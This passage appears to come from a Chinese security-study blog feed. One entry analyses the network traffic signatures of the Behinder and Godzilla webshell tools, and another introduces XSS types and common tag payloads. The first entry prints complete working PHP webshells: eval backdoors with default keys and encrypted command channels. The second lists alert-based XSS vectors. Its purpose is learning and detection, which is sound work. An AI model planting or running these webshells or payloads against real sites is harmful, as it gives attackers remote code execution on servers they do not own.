alt="image-20240502010147065"></p><blockquote><p>至于UA头的替换这里暂时还没有发现</p></blockquote><p>更具体地分析可以参考这篇文章：<a href="https://zhuanlan.zhihu.com/p/571463343">https://zhuanlan.zhihu.com/p/571463343</a></p><h2><span id="冰蝎30">冰蝎3.0</span></h2><ol><li>使用AES加密+base64编码发起两次请求。</li><li>冰蝎3.0取消了动态密钥获取的请求，AES的密钥直接固定为连接密码32位md5的前16位，默认连接密码是”rebeyond”(即密钥是md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)。服务端和客户端不再进行密钥的交互传递。两次请求中，第一次请求用于判断是否可以建立连接。第二次发送 phpinfo 等代码执行，获取网站的信息。</li><li>其可能作为识别特征的是:Content-Type:application&#x2F;octet-stream。application&#x2F;octet-stream 为 http 规范中较少使用的一种 Content-Type，其含义为只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件 ，后台接收参数只能有一个，而且只能是流 (或者字节数组)。</li></ol><p>shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>抓流量包看一下，这里要AES解码才能看出来，找个在线网站即可</p><p>第一次请求，可以看到直接发送POST请求，没有get了</p><p><img src="http://cdn.clown2024.cn/202407151450088.png" alt="image-20240502011823055"></p><h2><span id="冰蝎40">冰蝎4.0</span></h2><ol><li>提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。</li><li>Accept字段（弱特征），通常是Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01 意思是浏览器可接受任何文件，但最倾向application&#x2F;json 和 text&#x2F;javascript。</li><li>Content-Type字段（弱特征），通常是Content-type: Application&#x2F;x-www-form-urlencoded</li><li>与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</li><li>连接的端口有一定的特征，冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</li><li>使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive</li><li>有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</li><li>默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。</li></ol><p><img src="http://cdn.clown2024.cn/202407151450089.png" alt="image-20240502020936014"></p><blockquote><p>不过他可以兼容3.0使用密码的方式连接，默认连接密码和3.0是一样的，主要是看看他的其他的传输协议</p></blockquote><p>shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>xs发现加解密代码要自己写结果不会，那就不整了:(，那就只能网上找别人的代码了，这里找到一篇文章：<a href="https://xz.aliyun.com/t/11942?time__1311=mqmx0DBG0QdxyDBuex2lfD8DcGD9ngOWYD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/11942?time__1311=mqmx0DBG0QdxyDBuex2lfD8DcGD9ngOWYD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><img src="http://cdn.clown2024.cn/202407151450090.png" alt="image-20240502020538191"></p><p>选择传输协议，写好对应的加解密函数，然后本地生成服务端，就会生成各种对应的shell文件，上传然后连接即可。</p><p>4.0版本给我们自由发挥空间也很多，可以进行魔改成自己想要的传输方式，这里有一篇参考文章：<a href="https://xz.aliyun.com/t/12453?time__1311=mqmhD5AKYI1GODlxGoUDyjDnmtDkzlGzteD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/12453?time__1311=mqmhD5AKYI1GODlxGoUDyjDnmtDkzlGzteD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>具体的分析也不演示了，这里只是先大致了解，深入的之后再学习。(主要是懒)</p><h1><span id="哥斯拉">哥斯拉</span></h1><p>哥斯拉是一个基于流量、HTTP 全加密的 Webshell管理工具。和冰蝎类似，哥斯拉为加密的通讯流量，因此通过流量进行检测会有很大的难度，由于 WAF 等流量检测型安全设备无法对加密的流量进行解密，因此只能采用一些比较宽泛的匹配规则进行检测。如哥斯拉客户端使用JAVA 语言编写，在默认的情况下，如果不修改 User-Agent，User-Agent 会包含Java 版本信息。</p><p><strong>流量特征</strong></p><ul><li>User-Agent字段（弱特征），如果采用默认的情况，会暴露使用的jdk信息。不过哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。</li><li>Accept字段（弱特征），默认是Accept:text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, &#x2F;; q&#x3D;.2。同上，这个也可修改，只能作为辅助检测的特征。</li><li>Cookie中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。</li><li>响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</li></ul><p><strong>攻击过程</strong></p><p>哥斯拉可以指定webshell语言、加密方式、密钥、密码来生成webshell；然后将webshell上传到目标主机连接即可。</p><p><img src="http://cdn.clown2024.cn/202407151450091.png" alt="image-20240502134018866"></p><p>这是生成的异或加密的脚本的shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;pass&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>加密过程</strong></p><ol><li>先对原始数据进行base64的编码</li><li>然后和密钥key按位异或（这个密钥key是取shellsetting时自定义设置的那个密钥的md5值前16位。）</li><li>将得到的数据再base64一次，再url编码一次。</li><li>最后将得到的数据与密码进行拼接。</li><li>相对应的加密函数</li></ol><p><strong>看一下php的流量包</strong></p><p><img src="http://cdn.clown2024.cn/202407151450092.png" alt="image-20240502133946650"></p><p>可以看到cookie后面确实带着分号，如果要解密数据就按着shell.php里面给出的解密顺序解出来即可</p><p>对各语言的shell进行分析的文章可以看这篇：<a href="https://forum.butian.net/share/2517">https://forum.butian.net/share/2517</a></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习</title>
      <link href="/2024/04/29/xss%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/29/xss%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="xss简介">xss简介</span></h1><p>XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。</p><h1><span id="xss分类">xss分类</span></h1><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/397940947">https://zhuanlan.zhihu.com/p/397940947</a></p><h2><span id="反射型xss">反射型xss</span></h2><p>反射型xss的攻击流程：</p><p><img src="http://cdn.clown2024.cn/202407151445434.webp" alt="img"></p><p>反射型是比较常见的，他通常需要用户点击攻击者制作的链接才会触发，比如一个网站有这样的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;hello, <span class="hljs-subst">$_GET</span>[&#x27;user&#x27;]&lt;/p&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么我们可以制作一个url带上js代码给用户点击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;<br></code></pre></td></tr></table></figure><p>这样用户点击该链接后就会运行js代码</p><p>该方法收到Auditor、NoScript等防御手段影响较大</p><ul><li><p><strong>XSS Auditor</strong>：XSS Auditor 是一些现代浏览器内置的安全特性，它能够检测并阻止某些类型的XSS攻击。当浏览器识别到某些模式或行为与XSS攻击相符时，XSS Auditor 可以自动修改或阻止页面的加载，从而保护用户免受攻击。例如，如果一个网站将用户输入的数据直接回显到页面中，而没有进行适当的处理，XSS Auditor 可能会介入并防止恶意脚本的执行。</p></li><li><p><strong>NoScript</strong>：</p><p>NoScript 是一个浏览器扩展，它允许用户对网页上的脚本执行进行更细粒度的控制。通过NoScript，用户可以设置规则来禁止或允许特定网站或脚本的运行。在默认情况下，NoScript 可以阻止所有未经信任的网站运行JavaScript、Java以及其他可执行的代码。这可以有效地防御XSS 攻击，因为许多XSS 攻击依赖于恶意脚本的执行。</p></li></ul><h2><span id="存储型xss">存储型xss</span></h2><p>存储型xss的攻击流程：</p><p><img src="http://cdn.clown2024.cn/202407151445436.webp" alt="img"></p><p>存储型就是黑客改变了对象，直接把对象变为服务器了，将恶意的xss语句存入服务器，这样每次用户访问该正常服务器，服务器都会将带有恶意语句的页面一起返回，这样就可以造成持久化攻击。</p><p>在一些用户留言的功能就很容易发生这类xss。</p><h2><span id="dom型xss">DOM型xss</span></h2><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM Based XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xsstest</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;input&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">50</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;xsstest()&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p><p>DOM指的是文档对象模型（Document Object Model)，这是一种编程接口，用于处理可扩展标记语言（XML）和超文本标记语言（HTML）文档。通过DOM，程序员可以动态地访问和更新文档的内容、结构和样式。</p><p>在Web开发中，DOM用于Web浏览器和服务器端的脚本语言（如JavaScript）来操作Web页面。</p><p>比如上文的document.getElementById就是利用DOM来进行web页面的修改。</p><h2><span id="blind-xss">Blind XSS</span></h2><p>Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。</p><p>但Blind XSS不同的是，该xss类似盲打，即攻击者不知道这些payload会在何时何地执行，不一定能及时得到回显。</p><h1><span id="xss危害">XSS危害</span></h1><p>XSS可以导致下列的情况：</p><ol><li><p>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</p></li><li><p>攻击者能够在一定限度内记录用户的键盘输入，比如创建键盘监听器然后捕获信息之后利用<code>XMLHttpRequest</code>或<code>fetch</code>等API发送HTTP请求将数据发送给攻击者。</p></li><li><p>攻击者通过CSRF等方式以用户身份执行危险操作。</p></li><li><p>XSS蠕虫，例如Samy蠕虫</p><p>XSS蠕虫不需要用户下载或执行任何文件，而是通过用户与网页的交互来传播，通常是在用户不知不觉中进行的。</p><p>其工作原理通常如下：</p><ol><li><strong>寻找漏洞</strong>：攻击者寻找存在XSS漏洞的网站，这些漏洞可能允许攻击者注入恶意脚本。</li><li><strong>注入脚本</strong>：攻击者在网站上注入恶意脚本，该脚本可以是自我复制的，即能够自动寻找新的受害者并传播自身。</li><li><strong>传播机制</strong>：恶意脚本会在其他用户访问受感染的页面时执行，利用XSS漏洞将自身的副本注入到用户的会话中，或者诱使用户点击一个恶意链接，从而在用户的浏览器中执行。</li><li><strong>自动化攻击</strong>：XSS蠕虫可以自动执行各种攻击，如发送垃圾邮件、窃取用户信息、会话劫持等。</li><li><strong>隐藏性</strong>：由于XSS蠕虫不需要用户的直接交互，因此具有很高的隐蔽性，用户可能在不知情的情况下就成为了攻击的一部分。</li></ol></li><li><p>获取用户浏览器信息。</p></li><li><p>利用XSS漏洞扫描用户内网。</p></li></ol><h1><span id="同源策略">同源策略</span></h1><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p><p>这里给出一个与<code>http://store.company.com/dir/page.html</code> 的源进行对比的示例：</p><table><thead><tr><th align="left">URL</th><th align="left">结果</th><th align="left">原因</th></tr></thead><tbody><tr><td align="left"><code>http://store.company.com/dir2/other.html</code></td><td align="left">同源</td><td align="left">只有路径不同</td></tr><tr><td align="left"><code>http://store.company.com/dir/inner/another.html</code></td><td align="left">同源</td><td align="left">只有路径不同</td></tr><tr><td align="left"><code>https://store.company.com/secure.html</code></td><td align="left">失败</td><td align="left">协议不同</td></tr><tr><td align="left"><code>http://store.company.com:81/dir/etc.html</code></td><td align="left">失败</td><td align="left">端口不同（<code>http://</code> 默认端口是 80）</td></tr><tr><td align="left"><code>http://news.company.com/dir/other.html</code></td><td align="left">失败</td><td align="left">主机不同</td></tr></tbody></table><p>更详细的去看这篇文章就行：<a href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></p><h1><span id="xss常见标签">XSS常见标签</span></h1><p>参考文章：<a href="https://xz.aliyun.com/t/4067?time__1311=n4+xnD0DyGYQqxmw405+bWveAKP0K5DOD0rWD&u_atoken=b42a306fbbc31a9250e2f52be102914c&u_asession=01Umc-NzPKkpo5Cm1MZjj0PcZ4nYfzcCvQavG2wen-1XOfMhKklOuuynvcweWGuiHedlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05oI5YNvJnnW4ZbDwZ0jTEAnhHy28drN60y8oSj1AbOuy1F8ElkQRrO4HJQuPCGSD0Q0e5pVEDWIy78womJUHgWifdqZwkTyUiRS0RPiHtGMt2I4GcnVJ86Vg6pqUzr-2PiDWKzVeX040qH4eMgNzhdR1jz4r4BWyg3a9qlljGt2Fg2QMxYs6lyXb1lFWKql56RmnJ9pstOf9YSdbDJQ1eO604Hhg04odPKsBvl3o2kOTZgvqaz4fxLsoyCWh3mJ8rckYCQmaGgn_DBT-Jtjpp6GNiUV0VqAGRk9VySpSEqdJ6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=Tmy1B2vaFEZ7hbJejFOIbsVnxnA=">XSS总结 - 先知社区 (aliyun.com)</a></p><p>这里就copy一下常用标签，见到新的就补充进来</p><p><strong><script></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong><img></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><p><strong><input></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">竞争焦点，从而触发onblur事件,当左边的框要失去焦点时就会执行xss代码<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445437.png" alt="image-20240429235853943"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445438.png" alt="image-20240429235920732"></p><p><strong><details></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br>该标签用于展示详细信息，当收起或展开时就会弹出xss<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445439.png" alt="image-20240430000454901"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">使用open属性触发ontoggle事件，无需用户去触发，就是在进入页面时自动帮你展开一次详情<br>&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong><svg></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;svg onload=alert(&quot;xss&quot;);&gt;<br><br>SVG（Scalable Vector Graphics，可缩放矢量图形）元素；<br>onload 事件属性在 SVG 元素加载完成后触发，类似于 HTML 中的 &lt;img&gt; 标签的 onload 事件。<br></code></pre></td></tr></table></figure><p><strong><select></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;<br>&lt;select&gt; 是 HTML 中的一个元素，用于创建下拉列表。用户可以从列表中选择一个选项。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445440.png" alt="image-20240430000930281"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;select onfocus=alert(1) autofocus&gt;<br></code></pre></td></tr></table></figure><p><strong><iframe></strong></p><figure 